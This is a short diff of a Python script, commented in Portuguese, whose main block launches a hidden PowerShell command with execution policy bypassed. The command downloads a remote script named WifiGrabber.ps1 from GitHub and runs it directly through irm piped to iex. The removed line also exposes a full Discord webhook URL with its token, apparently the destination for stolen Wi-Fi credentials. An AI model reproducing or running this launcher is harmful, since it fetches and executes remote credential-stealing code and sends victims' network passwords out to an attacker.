@@ -8,7 +8,7 @@ def execute_powershell_command(command):
         return None, str(e)
 
 if __name__ == "__main__":
-    powershell_command = "powershell -w h -NoP -Ep Bypass $db='';$dc='https://discord.com/api/webhooks/1143896132548837396/KAnRerfgL_RAXItyby6bIuUjgYqBsVzeI1zYXvdeh8GP5tq_9bXo3PEzzuwZWYaRLrN0';irm https://raw.githubusercontent.com/lcandini/wifi-capture/main/WifiGrabber.ps1 | iex; Start-Sleep -Seconds 1; exit"  # Substitua isso pelo comando PowerShell que você deseja executar
+    powershell_command = "powershell -w h -NoP -Ep Bypass $db='';$dc='';irm https://raw.githubusercontent.com/lcandini/wifi-capture/main/WifiGrabber.ps1 | iex; Start-Sleep -Seconds 1; exit"  # Substitua isso pelo comando PowerShell que você deseja executar
     stdout, stderr = execute_powershell_command(powershell_command)
     
     if stdout:
